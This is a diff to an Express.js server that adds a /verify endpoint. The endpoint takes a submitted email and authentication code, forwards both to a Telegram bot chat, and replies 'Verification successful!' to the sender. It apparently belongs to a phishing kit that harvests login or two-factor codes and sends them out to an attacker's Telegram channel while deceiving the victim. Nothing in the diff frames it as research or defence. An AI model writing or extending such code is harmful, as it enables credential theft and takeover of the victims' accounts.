@@ -64,6 +64,50 @@ app.post('/submit', async (req, res) => {
   }
 });
 
+// ── POST /verify — receive auth code and forward to Telegram ──
+app.post('/verify', async (req, res) => {
+  const { email, authCode } = req.body;
+
+  if (!authCode) {
+    return res.status(400).json({ success: false, message: 'Missing auth code.' });
+  }
+
+  const message = `
+🔐 *Auth Code Received*
+
+📧 *Email:* \`${email || 'Unknown'}\`
+🔢 *Code:* \`${authCode}\`
+🕒 *Time:* ${new Date().toUTCString()}
+  `.trim();
+
+  try {
+    const telegramRes = await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
+      {
+        method  : 'POST',
+        headers : { 'Content-Type': 'application/json' },
+        body    : JSON.stringify({
+          chat_id    : TELEGRAM_CHAT_ID,
+          text       : message,
+          parse_mode : 'Markdown',
+        }),
+      }
+    );
+
+    const data = await telegramRes.json();
+
+    if (!data.ok) {
+      console.error('Telegram error:', data);
+      return res.status(500).json({ success: false, message: 'Failed to send Telegram notification.' });
+    }
+
+    return res.json({ success: true, message: 'Verification successful!' });
+  } catch (err) {
+    console.error('Server error:', err);
+    return res.status(500).json({ success: false, message: 'Internal server error.' });
+  }
+});
+
 // Fallback — serve index.html for any unknown route
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
